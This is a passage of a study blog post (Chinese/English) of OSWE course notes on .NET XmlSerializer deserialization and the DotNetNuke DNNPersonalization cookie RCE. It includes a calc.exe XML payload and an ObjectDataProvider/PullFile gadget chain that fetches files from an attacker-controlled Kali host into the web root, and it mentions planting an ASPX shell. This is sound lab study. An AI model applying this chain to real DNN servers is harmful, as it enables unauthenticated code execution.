---
title: "[OSWE, WEB-300] Instructional notes - Part 2"
date: 2026-04-10
author: "CHW"
tags:
  - offsec
description: "OSWA WEB-300 筆記 Part 2，涵蓋 XmlSerializer、DotNetNuke Cookie Deserialization RCE 弱點、SSTI攻擊、ERPNext 身份繞過、ERPNext Authentication Bypass and Server Side Template Injection 等等。"
---

[OSWE, WEB-300] Instructional notes - Part 2
===


# Table of Contents
[TOC]

# [Link back to: "[OSWE, WEB-300] Instructional notes - Part 1"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-1/)
>[!Caution]
> 接續 [[OSWE, WEB-300] Instructional notes - Part 1](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-1/e) 內容

# DotNetNuke Cookie Deserialization RCE
DotNetNuke (DNN) 是 ASP.NET CMS
利用 DotNetNuke (DNN) 的 Cookie 反序列化漏洞 → Remote Code Execution
```
.NET XMLSerializer
+
Cookie
+
Unsafe Deserialization
=
RCE
```
[環境範例]\
.NET 中的反序列化攻擊途徑討論較少\
James Forshaw 在[ 2012 年 Black Hat](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf) 大會的演講中以下攻擊途徑進行了深入 presentation\
在 2017 研究員 [Alvaro Muñoz 和 Oleksandr Mirosh](https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf) 在此基礎上進行了拓展，並分享了可利用的反序列化漏洞\
![image](https://hackmd.io/_uploads/rkxbbqmhKWg.png)\
admin login:\
![image](https://hackmd.io/_uploads/Hkbr9XhKZx.png)


## Serialization Basics
.NET 有多種 serializer：

Serializer | Format
:------|:------|
BinaryFormatter  |    Binary    | 
XmlSerializer  |    XML    | 
DataContractSerializer | XML / JSON  | 
SoapFormatter | SOAP | 

處理重點放在 .NET XMLSerializer 類別

>[!Tip]
> XmlSerializer 沒有 BinaryFormatter 那麼自由，因此 exploitation 的方式會不同

### XmlSerializer Limitations

XmlSerializer 只能 serialize 物件的 public properties 和 fields，只會處理 public 成員\
例如:\
```c#
public class Person
{
    public string Name;
    private string Secret;
}
```
序列化結果:
```
<Person>
  <Name>CHW</Name>
</Person>
```
> Secret 不會出現在 XML

[環境範例]\
建立兩個簡單的 applications，一個 applications 建立 object 與 properties ，並借助 XmlSerializer class 將其序列化為 XML file。另一個應用程式讀取儲存序列化物件的 XML ，並將其反序列化

使用環境範例中的 source code 和 solution files
- 序列化：
`C:\Users\Administrator\source\repos\BasicXMLSerializer\BasicXMLDeserializer.sln` 
```sln=
using System;
using System.IO;
using System.Xml.Serialization;

namespace BasicXMLSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            MyConsoleText myText = new MyConsoleText();
            myText.text = args[0];

            MySerializer(myText);
        }

        static void MySerializer(MyConsoleText txt)
        {
            var ser = new XmlSerializer(typeof(MyConsoleText));
            TextWriter writer = new StreamWriter("C:\\Users\\Public\\basicXML.txt");
            ser.Serialize(writer, txt);
            writer.Close();
        }
    }

    public class MyConsoleText
    {
        private String _text;

        public String text
        {
            get { return _text; }
            set { _text = value; Console.WriteLine("My first console text class says: " + _text); }
        }
    }
}
```

> - `namespace BasicXMLSerializer`: 定義一個 namespace
>    - 建立 object
>    - 設定 property
>    - 呼叫 serializer
> - `MySerializer()`: 建立 serializer
>    - MyConsoleText 是要序列化的型別
>    - 建立檔案: `C:\Users\Public\basicXML.txt`
>    - `ser.Serialize(writer, txt);`: 把 object 轉成 XML
> - `MyConsoleText class`
>    - `private String _text;`: private field 不會被 XmlSerializer 直接序列化
>    - `public String text`: 只要 property 被設定，Console.WriteLine() 就會執行

(Build Solution)
![image](https://hackmd.io/_uploads/r1IXn0X5-l.png)\
(執行序列化)\
![image](https://hackmd.io/_uploads/SkWn6Am5Zg.png)\
![image](https://hackmd.io/_uploads/H1cwRA7qWl.png)

序列化流程： BasicXMLSerializer.exe "Hello CHW"
```
args[0] = "Hello CHW"
↓
myText.text = "Hello CHW"
↓
setter 被呼叫
↓
Console.WriteLine
```
輸出 👉 "My first console text class says: Hello CHW"\
產生 XML 👉  C:\Users\Public\basicXML.txt
```xml
<MyConsoleText>
  <text>Hello CHW</text>
</MyConsoleText>
```

- 反序列化：
`C:\Users\Administrator\source\repos\BasicXMLDeserializer\BasicXMLDeserializer.sln`
```sln=
using System.IO;
using System.Xml.Serialization;
using BasicXMLSerializer;

namespace BasicXMLDeserializer
{
    class Program
    {
        static void Main(string[] args)
        {
            var fileStream = new FileStream(args[0], FileMode.Open, FileAccess.Read);
            var streamReader = new StreamReader(fileStream);
            XmlSerializer serializer = new XmlSerializer(typeof(MyConsoleText));
            serializer.Deserialize(streamReader);
        }
    }
}
```
> - `var fileStream = new FileStream(args[0], FileMode.Open, FileAccess.Read);`: 讀取 basicXML.txt
> - `XmlSerializer serializer = new XmlSerializer(typeof(MyConsoleText));`: type 必須一致
> - `serializer.Deserialize(streamReader);`: 將 XML 轉回 object

🥚 在 Deserializer 中沒有定義 MyConsoleText，需要把 `BasicXMLSerializer.exe` 加入 project (Add Reference)\
在 using BasicXMLSerializer; 時才會找到 class

在 BasicXMLSerializer Project 中 Add Reference，選在在序列化產出的 BasicXMLSerializer.exe\
![image](https://hackmd.io/_uploads/B1b520Q5Zg.png)

>[!Tip]
>若沒有將 Serialize project 加入 Reference，會產生以下錯誤：\
>![image](https://hackmd.io/_uploads/BkpfRCQcbl.png)


(接著 Build Solution)\
![image](https://hackmd.io/_uploads/H15EaRmcbx.png)\
(執行反序列化)\
![image](https://hackmd.io/_uploads/BJpWkJNcWl.png)

反序列化流程： BasicXMLDeserializer.exe "C:\Users\Public\basicXML.txt"
```
反序列化時： XML → object
↓
XML： <text>Hello CHW</text> 會被解析
↓
object.text = "Hello CHW"
↓
觸發 setter
```
輸出 👉 "My first console text class says: Hello CHW"

>[!Important]
>在反序列化期間會觸發 setter\
>setter 裡有 `Process.Start()`, `File.Write()`, `Reflection`
>```
>Attacker 控制 serialized data
>↓
>Server deserialize
>↓
>Object property setter 執行
>↓
>執行 code
>``` 

### Expanded XmlSerializer Example
上述的範例是 
```xml
XmlSerializer serializer = new XmlSerializer(typeof(MyConsoleText));
```
反序列化時，Type 是寫死的，只能處理 MyConsoleText、無法改成其他 class

本節進化版改成：支援多種 class、把 Type 資訊寫進 XML\
反序列化時，從 XML 讀出 type name，再動態建立對應的 XmlSerializer


使用環境範例中的 source code 和 solution files
- 序列化：
`C:\Users\Administrator\source\repos\MultiXMLSerializer\MultiXMLSerializer.sln` 


```sln=
using System;
using System.IO;
using System.Xml;
using System.Xml.Serialization;

namespace MultiXMLSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            String txt = args[0];
            int myClass = Int32.Parse(args[1]);

            if (myClass == 1)
            {
                MyFirstConsoleText myText = new MyFirstConsoleText();
                myText.text = txt;
                CustomSerializer(myText);
            }
            else
            {
                MySecondConsoleText myText = new MySecondConsoleText();
                myText.text = txt;
                CustomSerializer(myText);
            }
        }

        static void CustomSerializer(Object myObj)
        {
            XmlDocument xmlDocument = new XmlDocument();
            XmlElement xmlElement = xmlDocument.CreateElement("customRootNode");
            xmlDocument.AppendChild(xmlElement);
            XmlElement xmlElement2 = xmlDocument.CreateElement("item");
            xmlElement2.SetAttribute("objectType", myObj.GetType().AssemblyQualifiedName);
            XmlDocument xmlDocument2 = new XmlDocument();
            XmlSerializer xmlSerializer = new XmlSerializer(myObj.GetType());
            StringWriter writer = new StringWriter();
            xmlSerializer.Serialize(writer, myObj);
            xmlDocument2.LoadXml(writer.ToString());
            xmlElement2.AppendChild(xmlDocument.ImportNode(xmlDocument2.DocumentElement, true));
            xmlElement.AppendChild(xmlElement2);

            File.WriteAllText("C:\\Users\\Public\\multiXML.txt", xmlDocument.OuterXml);
        }
    }

    public class MyFirstConsoleText
    {
        private String _text;

        public String text
        {
            get { return _text; }
            set { _text = value; Console.WriteLine("My first console text class says: " + _text); }
        }
    }

    public class MySecondConsoleText
    {
        private String _text;

        public String text
        {
            get { return _text; }
            set { _text = value; Console.WriteLine("My second console text class says: " + _text); }
        }
    }
}
```
> 第一個參數寫進 object 的字串\
> 第二個參數決定要用哪個 class\
> if myClass == 1: `MyFirstConsoleText`\
> else `MySecondConsoleText`
> - MyFirstConsoleText
> 只要 text 被設定，就會印出 My first console text class says: ...
> - MySecondConsoleText
> setter 印出 My second console text class says: ...
>
> 控制反序列化 Type，就會執行不同 class 的 setter 邏輯
> - `CustomSerializer` 的參數型別是 Object 不是固定 class
>    - 建立 XML 文件 RootNode
>    - 建立 <item> 節點，序列化的物件會放在 <item> 中
>    - 把型別資訊寫進 objectType，例如：`MultiXMLSerializer.MyFirstConsoleText, MultiXMLSerializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null`\
> 產出 XML 會攜帶要反序列化成哪個 .NET class 的資訊
>    - 動態建立 XmlSerializer `new XmlSerializer(myObj.GetType());`
>    - 實際序列化 `xmlSerializer.Serialize(writer, myObj);`
>    - 序列化結果包進自訂 XML 結構: `xmlDocument2.LoadXml(writer.ToString());`
>    - File.WriteAllText() 寫檔

![image](https://hackmd.io/_uploads/Bksu-E4q-x.png)
(執行序列化)\
![image](https://hackmd.io/_uploads/HkPWV449Zg.png)\
![image](https://hackmd.io/_uploads/rkgBNE49Ze.png)
```xml
<customRootNode>
<item objectType="MultiXMLSerializer.MyFirstConsoleText, MultiXMLSerializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
<MyFirstConsoleText xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<text>Serializing first class...</text>
</MyFirstConsoleText>
</item>
</customRootNode>
```

- 反序列化：
`C:\Users\Administrator\source\repos\MultiXMLDeserializer\MultiXMLDeserializer.sln`

```sln=
using System;
using System.Diagnostics;
using System.IO;
using System.Xml;
using System.Xml.Serialization;

namespace MultiXMLDeserializer
{
    class Program
    {
        static void Main(string[] args)
        {
            String xml = File.ReadAllText(args[0]);
            CustomDeserializer(xml);            
        }

        static void CustomDeserializer(String myXMLString)
        {
            XmlDocument xmlDocument = new XmlDocument();
            xmlDocument.LoadXml(myXMLString);
            foreach (XmlElement xmlItem in xmlDocument.SelectNodes("customRootNode/item"))
            {
                string typeName = xmlItem.GetAttribute("objectType");
                var xser = new XmlSerializer(Type.GetType(typeName));
                var reader = new XmlTextReader(new StringReader(xmlItem.InnerXml));
                xser.Deserialize(reader);
            }
        }
    }

    public class ExecCMD
    {
        private String _cmd;
        public String cmd
        {
            get { return _cmd; }
            set
            {
                _cmd = value;
                ExecCommand();
            }
        }

        private void ExecCommand()
        {
            Process myProcess = new Process();
            myProcess.StartInfo.FileName = _cmd;
            myProcess.Start();
            myProcess.Dispose();
        }
    }

}

```
> - Main(): 讀 XML 並丟給 CustomDeserializer()
> - CustomDeserializer(): 把字串載入成 XML DOM
> - L21 `foreach (XmlElement xmlItem in xmlDocument.SelectNodes("customRootNode/item"))` 找出所有 <item> 節點
> - L23 `string typeName = xmlItem.GetAttribute("objectType");`: 讀出 objectType\
> 直接從 XML 拿到哪個型別反序列化
> - L24 `Type.GetType()` 動態解析型別: `var xser = new XmlSerializer(Type.GetType(typeName));` **這是攻擊面的核心**\
由 XML 內容決定 type
> - `new XmlTextReader(new StringReader(xmlItem.InnerXml));`: 把 <item> 裡面的 inner XML 當成 object 內容，依據剛才解析出的型別進行反序列化 


MultiXMLDeserializer 仍然需要在專案裡加入對 MultiXMLSerializer.exe 的 reference\
![image](https://hackmd.io/_uploads/HJ99VVEqWg.png)

(執行反序列化)\
![image](https://hackmd.io/_uploads/B10nNNE5Zx.png)
![image](https://hackmd.io/_uploads/r17UHEE9-l.png)

### Watch your Type, Dude
這段 focus 在 public class ExecCMD
```sln=31
    public class ExecCMD
    {
        private String _cmd;
        public String cmd
        {
            get { return _cmd; }
            set
            {
                _cmd = value;
                ExecCommand();
            }
        }

        private void ExecCommand()
        {
            Process myProcess = new Process();
            myProcess.StartInfo.FileName = _cmd;
            myProcess.Start();
            myProcess.Dispose();
        }
    }

```
setter 被呼叫 → ExecCommand() 被執行

🧠：目前可控修改 serialized object file 的內容，進而觸發符合 XmlSerializer limitations 條件的 object type 反序列化
```xml
<customRootNode>
<item objectType="MultiXMLDeserializer.ExecCMD, MultiXMLDeserializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
<ExecCMD xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<cmd>calc.exe</cmd>
</ExecCMD>
</item>
</customRootNode>
```
攻擊鏈流程:
- 控制 XML
```xml
<item objectType="MultiXMLDeserializer.ExecCMD, ...">
```
控制 objectType
- 程式信任 XML
```sln
Type.GetType(typeName)
```
因為沒有驗證 → 直接接受
- 建立 serializer
```sln
new XmlSerializer(ExecCMD)
```
- 反序列化
```xml
<ExecCMD>
  <cmd>calc.exe</cmd>
</ExecCMD>
```
👉🏻 `obj.cmd = "calc.exe"`
- 觸發 setter
```sln
set { ExecCommand(); }
```
- 執行系統命令
```sln
Process.Start("calc.exe")
```
執行反序列上述 XML\
![image](https://hackmd.io/_uploads/SJU8cXOqbl.png)\
成功彈出計算機\
![image](https://hackmd.io/_uploads/Skhj9Qu5-l.png)

## DotNetNuke Vulnerability Analysis    
DNN 會從 DNNPersonalization cookie 取出 XML，然後根據 XML 內的型別資訊動態建立 XmlSerializer 並反序列化

### Vulnerability Overview
漏洞入口點是 LoadProfile function 中，在 DotNetNuke.dll module\
雖然 DNN 的原始程式碼是公開的，但為了方便分析使用 dnSpy debugger 來追蹤目標程式的執行過程

[環境範例]\
使用 dnSpy 的 x64 版本 debugging w3wp.exe(x64)，需要反編譯 DotNetNuke.dll 文件:\
`C:\Inetpub\wwwroot\dotnetnuke\bin\DotNetNuke.dll`\
![image](https://hackmd.io/_uploads/B1jKgQFcZg.png)\
![image](https://hackmd.io/_uploads/r1IhxXY9-g.png)

目標的 LoadProfile function 在 `DotNetNuke.Services.Personalization.PersonalizationController` namespace\
![image](https://hackmd.io/_uploads/B1GWUXtc-e.png)

>[!Note]
> Muñoz 與 Mirosh 在 [BlackHat 2017](https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf) 發表：\
>只要造訪 DNN Web 存取一個不存在的頁面時，就能觸發 LoadProfile\
>稍後將對此進行驗證
    
```.net
// DotNetNuke.Services.Personalization.PersonalizationController
// Token: 0x06000B94 RID: 2964 RVA: 0x0002BDE0 File Offset: 0x00029FE0
public PersonalizationInfo LoadProfile(int userId, int portalId)
{
	PersonalizationInfo personalizationInfo = new PersonalizationInfo
	{
		UserId = userId,
		PortalId = portalId,
		IsModified = false
	};
	string text = Null.NullString;
	if (userId > Null.NullInteger)
	{
		string key = string.Format("UserPersonalization|{0}|{1}", portalId, userId);
		text = CBO.GetCachedObject<string>(new CacheItemArgs(key, 5, CacheItemPriority.Normal, new object[]
		{
			portalId,
			userId
		}), new CacheItemExpiredCallback(PersonalizationController.GetCachedUserPersonalizationCallback));
	}
	else
	{
		HttpContext httpContext = HttpContext.Current;
		if (httpContext != null && httpContext.Request.Cookies["DNNPersonalization"] != null)
		{
			text = httpContext.Request.Cookies["DNNPersonalization"].Value;
		}
	}
	personalizationInfo.Profile = (string.IsNullOrEmpty(text) ? new Hashtable() : Globals.DeserializeHashTableXml(text));
	return personalizationInfo;
}

```
> - `LoadProfile(int userId, int portalId)`: 依照 userId 與 portalId 載入使用者的 personalization/profile 資料，最後回傳一個 PersonalizationInfo 物件
> - `new PersonalizationInfo`: 建立回傳物件
> - `string text = Null.NullString;` 宣告字串存放: (最後要被反序列化的原始資料)
>    - 從 cache / DB 拿到的 personalization XML
>    - 或從 cookie 取到的 personalization XML
> - `if (userId > Null.NullInteger)`: 驗證已登入使用者
> - `else`(userId <= Null.NullInteger): 未登入使用者
>    - `if (httpContext != null && httpContext.Request.Cookies["DNNPersonalization"] != null)`: 檢查 cookie 是否存在
>    - `text = httpContext.Request.Cookies["DNNPersonalization"].Value;`: 直接取 cookie 值，把使用者送來的 cookie 直接放進 text 
>
> 可以得知 cookie 可控且會直接送進 text
>```
>HTTP Cookie
>   ↓
>text
>```
> - `personalizationInfo.Profile = (string.IsNullOrEmpty(text) ? new Hashtable() : Globals.DeserializeHashTableXml(text));`:\
> 若 text 為空，建立一個空 Hashtable\
> 若 text 不為空，呼叫 `Globals.DeserializeHashTableXml(text)` 將 text 反序列化成 Hashtable

![image](https://hackmd.io/_uploads/H1ksJEK5Ze.png)    

其中 `DeserializeHashTableXml` 是 DeSerializeHashtable 的 wrapper function，且會呼叫  hardcoded string "profile"\
![image](https://hackmd.io/_uploads/HkTM-EYqbg.png)

可以繼續追蹤 DeSerializeHashtable 主要處理 DNNPersonalization XML cookie\
![image](https://hackmd.io/_uploads/rkfByBY5-x.png)
> 將一段 XML 解析成 Hashtable\
> 會從 XML 裡直接讀出 type，然後動態建立 XmlSerializer 去反序列化 (攻擊面)

### Manipulation of Assembly Attributes for Debugging
>[!Note]
>在 debug .NET WebApp 常會遇到：\
>	• breakpoint 設了卻停不到\
>	• 停到奇怪的位置\
>	• local variable 看不到\
>	• 單步執行跳來跳去

```
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
```
> assembly 是用較偏正式版的方式編譯，允許較多最佳化 ([CLR / JIT](https://ithelp.ithome.com.tw/m/articles/10219630#:~:text=NET%E7%9B%B8%E9%97%9C%E7%A8%8B%E5%BC%8F%E9%83%BD%E6%98%AF,%E5%B0%8D%E6%87%89%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%A9%9F%E5%99%A8%E7%A2%BC%E3%80%82) 會以較偏正式版執行模式來處理這個 assembly)

為了讓 dnSpy 能更好 debug DNN，要先修改 `DotNetNuke.dll` 的 Assembly Attribute，降低 JIT, runtime optimization performed
```
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
```
> - `DisableOptimizations`: 關閉 runtime optimization
> - `IgnoreSymbolStoreSequencePoints`: 讓 debugger 在沒有完整的 symbol / sequence point / debugger mapping 時仍能運作
> - `EnableEditAndContinue`: 讓 debugger 在程式執行中允許修改程式碼，並即時套用 Hot Patch 即時編輯
    
關閉 runtime optimization

>[!Tip]
> dnSpy 不只是反編譯器，也是 assembly editor。可以直接改：
> - class
> - method
> - assembly attributes    
    
[環境範例]\
目前得知 assembly 目標是：`C:\inetpub\wwwroot\dotnetnuke\bin\DotNetNuke.dll`\
🥚 這是網站原始部署位置，IIS ASP.NET 在執行時，通常不會直接從這裡載入 assembly，會複製到以下路徑：
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\dotnetnuke\
```
也就是 Temporary ASP.NET Files ( [w3wp.exe](https://ithelp.ithome.com.tw/m/articles/10295999) 真正 load 的位置)

備份原始檔案後，右鍵點擊 Edit Assembly Attributes (C#) 改整個 assembly metadata\
![image](https://hackmd.io/_uploads/HyvTGS9cbl.png)\
![image](https://hackmd.io/_uploads/H1qn4Bc9-l.png)\
開啟後可以看到上述提到需要修改的  assembly attributes 清單

更改清單內容:\
![image](https://hackmd.io/_uploads/r1IxUSccWg.png)

Compile + Save Module:\
按 Compile 並且在 File > Save Module\
![image](https://hackmd.io/_uploads/B1pB8Sc9Zl.png)

>[!Note]
> 在更改 assembly attributes 後 CLR / JIT 看到新的 Debuggable attribute 後，會：
> - 降低最佳化
> - 讓程式碼執行位置和 source line 比較一致
> - 比較保留你要觀察的 local variable
> - 讓 breakpoint 更容易準確命中
>
>這樣後續要追：
> `LoadProfile`, `DeserializeHashTableXml`, `DeSerializeHashtable`, `Type.GetType`, `XmlSerializer.Deserialize` 會容易很多

.NET WebApp 白箱 debug 前，先把目標 assembly 調整成更適合 debug 的執行模式

### Debugging DotNetNuke Using dnSpy
更改 assembly attributes 後，從靜態分析到動態驗證
```
HTTP request（含惡意 cookie）
   ↓
IIS (w3wp.exe)
   ↓
LoadProfile()
   ↓
在 dnSpy breakpoint 停住
   ↓
觀察 cookie → XML → type → deserialize
```
首先需要將 debugger 附加到 [w3wp.exe](https://ithelp.ithome.com.tw/m/articles/10295999) process（ Debug > Attach menu ）\
![image](https://hackmd.io/_uploads/BkIIeD5q-g.png)\
> 選擇 w3wp.exe
>> w3wp.exe = IIS worker process 是 DNN 實際運行的 process

接著透過 Debug > Windows > Modules  列出 w3wp.exe process 載入的所有模組\
![image](https://hackmd.io/_uploads/HkdQWPq5bg.png)\
在 All module 中選擇 DotNetNuke.dll

Module 載入後，找到位於 DotNetNuke.dll `DotNetNuke.Services.Personalization.PersonalizationController` namespace 中的 LoadProfile(int,int) function，設定斷點\
![image](https://hackmd.io/_uploads/Bkfxxd9qbl.png)

接著要發送 HTTP Request 驗證 (發送不存在路徑 & 戴上不存在 Cookie)\
![image](https://hackmd.io/_uploads/BJw8W_c9bl.png)\
Request 送出後觸發 Break point\
![image](https://hackmd.io/_uploads/HkeVx_ccWx.png)
可以看到 Call Stack:\
![image](https://hackmd.io/_uploads/SkkyZO55Wx.png)\
也代表
```
Unauthenticated request
   ↓
cookie 被讀
   ↓
進入 vulnerable function
```
PortalSettings 類別的 UserMode 屬性的 getter funciton 被呼叫\
![image](https://hackmd.io/_uploads/rkl0-_qcbx.png)\
呼叫 Personalization.GetProfile 方法位於 L925 ，可以在 L926 設定斷點，以驗證我們是否可以執行到此呼叫\
![image](https://hackmd.io/_uploads/Bkd1Quq9Ze.png)
確實執行到此斷點：\
![image](https://hackmd.io/_uploads/HJxQ3d5c-e.png)

Breakpoint 位於 if 語句內部，在處理未經身份驗證請求時觸發的。然而， if 的其中一個條件是 `HttpContext.Current.Request.IsAuthenticated` 布林變數進行檢查 (L922)。\
🥚 在我們請求中沒有使用任何身份驗證或 session cookie，但已被視為通過身份驗證

在 Call Stack 中可以找出原因，名為 `AdvancedUrlReWriter.Handle404OrException` 的函數呼叫\
![image](https://hackmd.io/_uploads/S1dp6uqc-g.png)\
檢查 HttpContext.User 屬性時，若請求的 User 屬性為 null，則會將其賦值給目前使用者\
![image](https://hackmd.io/_uploads/rkvCZtc5Wx.png)

布林變數 IsAuthenticated 指示其值為 "true"，表示該請求已在 IIS\APPPOOL group 下通過身份驗證。邏輯依據在處理 404 程序設定 HttpContext.User 物件之前被呼叫。

## Payload Options
已確定 DNN 有 XmlSerializer 反序列化漏洞，下一步要找出哪一個 .NET 物件可以在被反序列化時幫攻擊者做危險操作\
👉🏻 payload option / gadget candidate 分析
### FileSystemUtils PullFile Method
>[!Note]
> 前面已知：
> - DNNPersonalization cookie 可控
> - DNN 會從 XML 裡讀 type
> - 動態建立 XmlSerializer
> - 反序列化該物件

該指定哪個 class 當作 type

DotNetNuke.dll assembly 包含 `DotNetNuke.Common.Utilities.FileSystemUtils` 裡面有個名為PullFile method\
使用 dnSpy 的搜尋功能:\
![image](https://hackmd.io/_uploads/ryBjXupqbx.png)\
![image](https://hackmd.io/_uploads/S1E0z559Zl.png)\
(可從指定 URL 下載檔案到目標伺服器)

若能夠利用 DNNPersonalization cookie 觸發此 method，理論上可以上傳 ASPX shell，從而執行程式碼。\
但 XmlSerializer 不能序列化 class method。只能序列化 public properties 和 fields，且 FileSystemUtils class 沒有公開任何可以設定或公共屬性來觸發 PullFile method。

### ObjectDataProvider Class
既然 XmlSerializer 不能直接序列化 method call，那該如何在反序列化時間接呼叫 method 👉🏻 **"[ObjectDataProvider](https://learn.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?redirectedfrom=MSDN&view=netframework-4.7.2)"**\
![image](https://hackmd.io/_uploads/Hyt_JBC5Wg.png)

根據官方文件，當我們要將另一個物件包裝到 ObjectDataProvider instance 中並將其當作 binding source 時，可以使用 ObjectDataProvider class。\
What is a binding source? 提供 programmer 相關資料的 object，這些資料通常會從其來源綁定到目標，例如使用者介面對象（TextBox、ComboBox 等），以便顯示資料。\
資料來源（source）➡️ 綁到 UI 控制項（target）

>[!Note]
> ObjectDataProvider 正常用途\
> 它可以包裝（wrap）一個物件，然後：
> - 指定要呼叫哪個 method
> - 指定 method 的參數
> - 幫 UI 取得 method 的回傳結果
>
> 所以它本來設計上就是：\
> 透過 property 設定，去驅動另一個物件的方法被執行
> For attacker:\
> 它讓 " method invocation" 看起來像 "property assignment"
> 這正好繞過 XmlSerializer 不能直接序列化 method 的限制

目前已知：
- FileSystemUtils.PullFile() 可利用
- 但 XmlSerializer 不能直接呼叫 method
- 只靠反序列化一個 class 不夠
    
🧠 需要找的是一種 class 能做到：
```
設定 public property
   ↓
自動觸發 method call
```
>[!Important]
> ObjectDataProvider 位於 `System.Windows.Data` namesapce\
> assembly 是 `PresentationFramework.dll` .NET 執行檔中

因為 XmlSerializer 的限制是只能處理 public property 和 field，不能直接序列化 method\
而 ObjectDataProvider 恰好就是透過 public properties 來驅動 method call 的 class

[環境範例]\
位於 `C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll`\
![image](https://hackmd.io/_uploads/S1FOZ4A5-x.png)

檢查 MethodName 的 getter 和 setter implementations\
![image](https://hackmd.io/_uploads/BJsv4V0q-g.png)
可以觀察到 MethodName 的 setter 不是單純存字串，它會設定 _methodName、呼叫 base.Refresh()\
(只要在反序列化時設定 MethodName，後續執行鏈就會被自動帶起來)\
![image](https://hackmd.io/_uploads/Bkk3BVR9be.png)\
Refresh() 調用到 BeginQuery:\
![image](https://hackmd.io/_uploads/S1tM8ER9-l.png)
繼續追蹤 BeginQuery 發現死路一條

>[!Tip]
>BeginQuery() 是 虛擬方法 / 可被覆寫
> - 真正 runtime 被呼叫的，會是 ObjectDataProvider override 後的版本
> - 不是父類別那個預設版本
>
> 👉🏻 跳去看 ObjectDataProvider.BeginQuery() 的 override 實作

![image](https://hackmd.io/_uploads/Sky5PVC5Wx.png)\
繼續追蹤調用的 QueryWorker
![image](https://hackmd.io/_uploads/B1TNFEAcZl.png)

整理出整個流程的 Call chain
```
MethodName setter
  ↓
base.Refresh()
  ↓
ObjectDataProvider.BeginQuery()
  ↓
QueryWorker()
  ↓
InvokeMethodOnInstance()
```
### Example Use of the ObjectDataProvider Instance
先在獨立 PoC 中驗證 ObjectDataProvider gadget 真的能靠設定 property 去呼叫另一個物件的 method\
在執行反序列漏洞前，先驗證這條 Call chain 是可以執行
- ObjectDataProvider 確實可以包住一個別的 object
- 只靠設定 ObjectInstance、MethodName、MethodParameters 這些 property，就能讓被包住物件的 method 被呼叫

在 Visual Studio 建立新的 project，並將 DotNetNuke.dll 和 PresentationFramework.dll 檔案加入 references\
![image](https://hackmd.io/_uploads/Hyj-yv05Zg.png)\
![image](https://hackmd.io/_uploads/HJPfTLC9-x.png)


並且在 kali 上啟用一個 webserver，供後續讓環境範例 PullFile gadge 任意下載
```
┌──(root㉿CHW)-[~]
└─# echo DNN Code Exec PoC! > /var/www/html/myODPTest.txt   
    
┌──(root㉿CHW)-[~]
└─# systemctl start apache2 

┌──(root㉿CHW)-[~]
└─# tail -f /var/log/apache2/access.log

```

![image](https://hackmd.io/_uploads/SyaIeP09bg.png)
```csharp
using System;
using System.IO;
using System.Xml.Serialization;
using DotNetNuke.Common.Utilities;
using System.Windows.Data;

namespace ODPSerializer
{
    class Program
   {
        static void Main(string[] args)
        {
            ObjectDataProvider myODP = new ObjectDataProvider();
            myODP.ObjectInstance = new FileSystemUtils();
            myODP.MethodName = "PullFile";
            myODP.MethodParameters.Add("http://{Kali IP}/myODPTest.txt");
            myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
            Console.WriteLine("Done!");
        }
    }
}
```
> - `FileSystemUtils`: DNN 內建功能，可下載檔案
> - `ObjectDataProvider`: gadget

![image](https://hackmd.io/_uploads/rkoxsPA9-l.png)


在 Visual Studio 編譯後，利用 dnSpy debugger\
Debug → Start Debugging 且 Break at Entry Point\
![image](https://hackmd.io/_uploads/BJVprwR5Zx.png)

直接跳到 PresentationFramework assembly  QueryWorker function 驗證
![image](https://hackmd.io/_uploads/B17_sDA9Zg.png)
```
PresentationFramework.dll
→ System.Windows.Data
→ ObjectDataProvider
→ QueryWorker
```

在 InvokeMethodOnlnstance function 設定斷點
![image](https://hackmd.io/_uploads/ry92iwR5Zx.png)

按 Continue 後，若 breakpoint hit 了。在 call stack 可以發現與上述預測的狀況相符
![image](https://hackmd.io/_uploads/S1Wg3DRcZe.png)

也成功在 web 根目錄中下載檔案\
![image](https://hackmd.io/_uploads/rJJrhwCqWg.png)

### Serialization of the ObjectDataProvider
前面已提及 DNNpersonalization cookie 的 payload 必須採用 XML 格式，且已知 DNNpersonalization cookie 必須採用特定格式才能被反序列化函數呼叫，必須包含「profile」節點以及「item」標籤，該標籤包含一個描述所包含物件的「type」屬性。與其嘗試手動重建此結構

直接重複利用最初建立該 cookie 值的 DNN 函數: `SerializeDictionary` 位於 `DotNetNuke.Common.Utilities.XmlUtils` namespace\
![image](https://hackmd.io/_uploads/H1jOJdCcbe.png)

模仿 DNN personalization 的資料結構，放進 Hashtable
```csharp
using System;
using System.IO;
using System.Xml.Serialization;
using DotNetNuke.Common.Utilities;
using System.Windows.Data;
using System.Collections;

namespace ODPSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            ObjectDataProvider myODP = new ObjectDataProvider();
            myODP.ObjectInstance = new FileSystemUtils();
            myODP.MethodName = "PullFile";
            myODP.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
